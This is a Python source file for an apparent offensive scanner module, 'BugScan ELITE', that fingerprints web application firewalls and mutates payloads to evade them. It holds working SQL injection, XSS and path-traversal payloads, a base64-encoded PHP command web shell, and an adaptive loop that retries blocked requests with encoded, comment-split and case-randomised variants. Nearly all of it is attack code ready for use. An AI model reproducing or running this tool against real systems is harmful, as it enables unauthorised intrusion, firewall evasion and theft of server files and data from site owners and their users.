"""
BugScan ELITE — Intelligent Payload Mutation Engine
Analyzes server error responses to generate novel bypass payloads.
WAF fingerprinting → adaptive bypass strategy → mutated payload variants.
"""
import re, time, logging, random, urllib.parse
from typing import List, Dict, Optional, Tuple

log = logging.getLogger("elite.mutator")

# ── Error signature → WAF vendor ─────────────────────────────────────────────
WAF_ERROR_SIGS = {
    "cloudflare":   ["cf-ray","cloudflare","please complete the security check",
                     "sorry, you have been blocked","cf_chl_captcha"],
    "akamai":       ["access denied by policy","akamai","ak_bmsc","ghost hunter"],
    "imperva":      ["incapsula incident","incapsula","x-iinfo","visid_incap",
                     "request unsuccessful"],
    "aws_waf":      ["awswaf","x-amzn-requestid","403 forbidden"],
    "modsecurity":  ["mod_security","not acceptable","406","illegal request"],
    "f5_bigip":     ["application security manager","bigipserver","the requested url"],
    "fortiweb":     ["fortiweb","fortigate","web application firewall"],
    "sucuri":       ["sucuri","x-sucuri","access denied - sucuri website firewall"],
    "barracuda":    ["barracuda","barra_counter_session"],
    "wallarm":      ["wallarm","x-wallarm"],
    "datadome":     ["datadome","x-datadome","bot detected"],
}

# ── Mutation strategies per character type ────────────────────────────────────
CHAR_MUTATIONS = {
    "'": [
        "%27",          # URL encode
        "%2527",        # Double URL encode
        "\\x27",        # Hex escape
        "\\'",          # Backslash escape
        "\u0027",       # Unicode
        "%ef%bc%87",    # Fullwidth apostrophe
        "`",            # Backtick substitute
        "''",           # Double apostrophe
        "´",            # Acute accent
        "ʼ",            # Modifier letter apostrophe
    ],
    " ": [
        "+",            # Plus
        "%20",          # URL encode
        "%09",          # Tab
        "%0a",          # Newline
        "%0b",          # Vertical tab
        "%0c",          # Form feed
        "%0d",          # Carriage return
        "%a0",          # Non-breaking space
        "/**/",         # SQL comment
        "/*!*/",        # MySQL comment
        "%c0%a0",       # Overlong space
    ],
    "<": [
        "%3c","%3C","&lt;",
        "%ef%bc%9c",    # Fullwidth
        "\u003c",
        "&#60;","&#x3c;",
        "%253c",        # Double encode
    ],
    ">": [
        "%3e","%3E","&gt;",
        "%ef%bc%9e",    # Fullwidth
        "\u003e",
        "&#62;","&#x3e;",
    ],
    "=": [
        "%3d","%3D","\u003d",
        "%ef%bc%9d",
        "&#61;",
    ],
    "/": [
        "%2f","%2F","\\","%5c",
        "%c0%af",       # Overlong slash
        "%e0%80%af",
        "%252f",
    ],
    "UNION": [
        "UN/**/ION","UN%09ION","UN%0aION",
        "/*!UNION*/","un%00ion","U%4eION",
        "uNiOn","UnIoN",
    ],
    "SELECT": [
        "SEL/**/ECT","SEL%09ECT","SEL%0aECT",
        "/*!SELECT*/","se%00lect","S%45LECT",
        "sElEcT","SeLeCt",
    ],
    "AND": ["AN/**/D","A%09ND","/*!AND*/","AnD","a%00nd"],
    "OR":  ["O/**/R","O%09R","/*!OR*/","Or","o%00r"],
    "alert": [
        "alert`1`","\u0061lert","al\u0065rt",
        "confirm","prompt",
        "ale/**/rt","(alert)(1)",
        "%61lert","a&#108;ert",
    ],
    "script": [
        "scr/**/ipt","sc%09ript","scr\x00ipt",
        "%73cript","\u0073cript","scRipT",
    ],
}

# ── Case variation generator ──────────────────────────────────────────────────
def _case_variants(payload: str, count: int = 3) -> List[str]:
    """Generate case-randomized variants."""
    variants = []
    for _ in range(count):
        v = "".join(
            c.upper() if random.random() > 0.5 else c.lower()
            for c in payload
        )
        if v != payload: variants.append(v)
    return variants


# ── Comment insertion ─────────────────────────────────────────────────────────
def _insert_comments(payload: str) -> List[str]:
    """Insert SQL/HTML comments into payload."""
    variants = []
    # SQL comments
    for kw in ["UNION","SELECT","AND","OR","WHERE","FROM","INSERT","DROP"]:
        if kw in payload.upper():
            v = re.sub(kw, f"{kw[:2]}/**/{kw[2:]}", payload, flags=re.I, count=1)
            if v != payload: variants.append(v)
    # Zero-width chars
    zw = ["\u200b","\u200c","\u200d","\ufeff"]
    for z in zw[:2]:
        mid = len(payload)//2
        variants.append(payload[:mid]+z+payload[mid:])
    return variants


# ── Encoding chains ───────────────────────────────────────────────────────────
def _encode_chain(payload: str, depth: int = 2) -> List[str]:
    """Apply encoding chains to payload."""
    variants = []
    # Single URL encode
    v1 = urllib.parse.quote(payload, safe="")
    variants.append(v1)
    # Double URL encode
    v2 = urllib.parse.quote(v1, safe="")
    variants.append(v2)
    # HTML entity encode
    v3 = "".join(f"&#{ord(c)};" for c in payload)
    variants.append(v3)
    # Hex encode
    v4 = "".join(f"\\x{ord(c):02x}" for c in payload)
    variants.append(v4)
    return variants


# ── HPP (HTTP Parameter Pollution) ───────────────────────────────────────────
def _hpp_variants(param: str, payload: str) -> List[Dict]:
    """Generate HPP variants: same param multiple times."""
    return [
        {param: [payload, "safe"]},          # pollute after
        {param: ["safe", payload]},          # pollute before
        {f"{param}[]": [payload]},           # array notation
        {f"{param}%00": [payload]},          # null byte in param name
    ]


# ── Chunked encoding payload ──────────────────────────────────────────────────
def _chunked_body(payload: str) -> Tuple[str, Dict]:
    """Wrap payload in chunked transfer encoding."""
    chunk = payload.encode().hex()
    return f"{len(payload):x}\r\n{payload}\r\n0\r\n\r\n", \
           {"Transfer-Encoding": "chunked"}


class PayloadMutator:
    """
    Analyzes error responses to determine what's being blocked,
    then generates targeted bypass mutations.
    """

    def __init__(self):
        self._blocked_patterns: List[str] = []
        self._waf_vendor: str = ""
        self._mutation_history: List[Dict] = []

    def analyze_block(self, response_body: str,
                      response_headers: Dict) -> Dict:
        """
        Analyze a blocked response to fingerprint the WAF
        and determine what triggered the block.
        """
        body_lower = response_body.lower()
        hdrs_str   = " ".join(f"{k}:{v}".lower()
                              for k,v in response_headers.items())
        combined   = body_lower + " " + hdrs_str

        # Detect WAF vendor
        vendor = "unknown"
        for v, sigs in WAF_ERROR_SIGS.items():
            if any(s in combined for s in sigs):
                vendor = v
                break

        self._waf_vendor = vendor

        # What keywords triggered the block?
        triggered = []
        check_kw = ["union","select","insert","drop","script","alert","onerror",
                    "onload","javascript","eval","exec","system","passthru",
                    "../","etc/passwd","cmd","bash","sh","wget","curl"]
        for kw in check_kw:
            if kw in body_lower:
                triggered.append(kw)

        return {
            "vendor":   vendor,
            "triggered":triggered,
            "strategy": self._pick_strategy(vendor),
        }

    def _pick_strategy(self, vendor: str) -> List[str]:
        strategies = {
            "cloudflare":  ["unicode","chunked","hpp","case","encoded_keywords"],
            "akamai":      ["hpp","json_body","multipart","case"],
            "imperva":     ["chunked","newline","double_encode","unicode"],
            "aws_waf":     ["double_encode","json_nested","hpp","comment"],
            "modsecurity": ["case","comment","null_byte","whitespace","inline_comment"],
            "f5_bigip":    ["chunked","hpp","unicode","case"],
            "unknown":     ["case","comment","double_encode","unicode","null_byte"],
        }
        return strategies.get(vendor, strategies["unknown"])

    def mutate(self, payload: str, strategy: List[str] = None,
               context: str = "generic") -> List[str]:
        """
        Generate mutated payload variants.
        context: sqli | xss | generic | lfi | ssti
        """
        if strategy is None:
            strategy = self._pick_strategy(self._waf_vendor)

        variants = [payload]  # always include original

        for strat in strategy:
            if strat == "case":
                variants.extend(_case_variants(payload))

            elif strat == "comment":
                variants.extend(_insert_comments(payload))

            elif strat == "double_encode":
                v1 = urllib.parse.quote(payload, safe="")
                v2 = urllib.parse.quote(v1, safe="")
                variants.extend([v1, v2])

            elif strat == "unicode":
                # Replace ASCII chars with unicode equivalents
                v = payload
                for char, reps in CHAR_MUTATIONS.items():
                    if char in v and len(char) == 1:
                        v = v.replace(char, random.choice(reps), 1)
                if v != payload: variants.append(v)

            elif strat == "null_byte":
                variants.append(payload + "%00")
                variants.append("%00" + payload)

            elif strat == "whitespace":
                for ws in ["%09","%0a","%0b","%0d","%a0","/**/"]:
                    v = payload.replace(" ", ws)
                    if v != payload: variants.append(v)

            elif strat == "encoded_keywords":
                v = payload
                for kw, muts in CHAR_MUTATIONS.items():
                    if len(kw) > 1 and kw in v.upper():
                        v = re.sub(kw, random.choice(muts), v, flags=re.I, count=1)
                if v != payload: variants.append(v)

            elif strat == "inline_comment":
                v = payload
                for kw in ["UNION","SELECT","AND","OR"]:
                    if kw in v.upper():
                        mid = len(kw)//2
                        v = re.sub(kw, f"{kw[:mid]}/*!*/{kw[mid:]}", v,
                                   flags=re.I, count=1)
                if v != payload: variants.append(v)

            elif strat == "hpp":
                # Signal to caller that HPP should be used
                pass

        # Context-specific mutations
        if context == "sqli":
            variants.extend(self._sqli_mutations(payload))
        elif context == "xss":
            variants.extend(self._xss_mutations(payload))
        elif context == "lfi":
            variants.extend(self._lfi_mutations(payload))

        # Deduplicate preserving order
        seen = set()
        result = []
        for v in variants:
            if v not in seen:
                seen.add(v)
                result.append(v)

        log.debug(f"[mutator] {len(result)} variants for: {payload[:30]}...")
        return result[:25]  # cap at 25

    def _sqli_mutations(self, payload: str) -> List[str]:
        variants = []
        # Time-based alternatives
        if "SLEEP" in payload.upper():
            variants += [
                payload.replace("SLEEP(5)","SLEEP(4.9)"),
                payload.replace("SLEEP","BENCHMARK(5000000,MD5(1))"),
                "'; WAITFOR DELAY '0:0:5'--",
                "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--",
            ]
        # UNION bypass
        if "UNION" in payload.upper():
            variants += [
                re.sub("UNION", "UN/**/ION", payload, flags=re.I),
                re.sub("UNION", "UNION/*!50000SELECT*/", payload, flags=re.I),
                re.sub("SELECT", "SEL%09ECT", payload, flags=re.I),
            ]
        # Auth bypass alternatives
        variants += [
            "' OR 1-- -",
            "admin'--",
            "' OR 'x'='x",
            "') OR ('1'='1",
            "' OR 1=1#",
            "' OR 1=1/*",
        ]
        return variants

    def _xss_mutations(self, payload: str) -> List[str]:
        return [
            # Event handler variations
            "<img src=x onerror=alert`1`>",
            "<img src=x onerror=(alert)(1)>",
            "<svg/onload=alert(1)>",
            "<details open ontoggle=alert(1)>",
            "<body onpageshow=alert(1)>",
            "<video src=x onerror=alert(1)>",
            # Protocol handlers
            "javascript://%0aalert(1)",
            "data:text/html,<script>alert(1)</script>",
            # Encoding
            "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
            "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
            # Template literals
            "${alert(1)}",
            "{{constructor.constructor('alert(1)')()}}",
            # Filter bypass
            "<scr<script>ipt>alert(1)</scr</script>ipt>",
            "<img src=\"x\" onerror=\"&#97;lert(1)\">",
        ]

    def _lfi_mutations(self, payload: str) -> List[str]:
        return [
            "../../../etc/passwd",
            "../../../../etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "..%252F..%252F..%252Fetc%252Fpasswd",
            "....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
            "/proc/self/environ",
            "/proc/self/cmdline",
            "php://filter/convert.base64-encode/resource=/etc/passwd",
            "php://input",
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
        ]

    def adaptive_scan(self, url: str, param: str, payloads: List[str],
                      request_fn) -> List[Dict]:
        """
        Adaptive scanning: analyze blocks, mutate payloads, retry.
        """
        results = []
        remaining = list(payloads)

        while remaining:
            payload = remaining.pop(0)
            # Build test URL
            try:
                parsed = __import__("urllib.parse",fromlist=["urlparse","parse_qs","urlencode","urlunparse"])
                p = parsed.urlparse(url)
                qs = parsed.parse_qs(p.query)
                nq = dict(qs); nq[param] = [payload]
                test_url = parsed.urlunparse(p._replace(
                    query=parsed.urlencode(nq, doseq=True)))
            except: continue

            r = request_fn(test_url)
            if not r: continue

            status, hdrs, body = r

            # If blocked — analyze and generate mutations
            if status in (403, 406, 429, 503) or self._looks_blocked(body):
                analysis = self.analyze_block(body, hdrs)
                log.debug(f"[mutator] blocked by {analysis['vendor']}, "
                          f"generating mutations...")
                mutations = self.mutate(payload, analysis["strategy"])
                # Add mutations to front of queue (priority retry)
                remaining = [m for m in mutations if m != payload] + remaining[:5]
            else:
                # Not blocked — check for vuln indicators
                results.append({
                    "url":     test_url,
                    "payload": payload,
                    "status":  status,
                    "body":    body[:200],
                })

            time.sleep(0.1)  # Brief throttle

        return results

    def _looks_blocked(self, body: str) -> bool:
        body_lower = body.lower()
        return any(s in body_lower for s in [
            "access denied","blocked","forbidden","waf","firewall",
            "security","not acceptable","illegal","protection",
        ])


# Global singleton
_mutator: Optional[PayloadMutator] = None

def get_mutator() -> PayloadMutator:
    global _mutator
    if _mutator is None:
        _mutator = PayloadMutator()
    return _mutator

def mutate_for_waf(payloads: List[str], waf_vendor: str = "") -> List[str]:
    """Quick function: mutate a payload list for a known WAF."""
    m = get_mutator()
    if waf_vendor:
        m._waf_vendor = waf_vendor
    result = []
    for p in payloads:
        result.extend(m.mutate(p))
    return list(dict.fromkeys(result))  # deduplicate
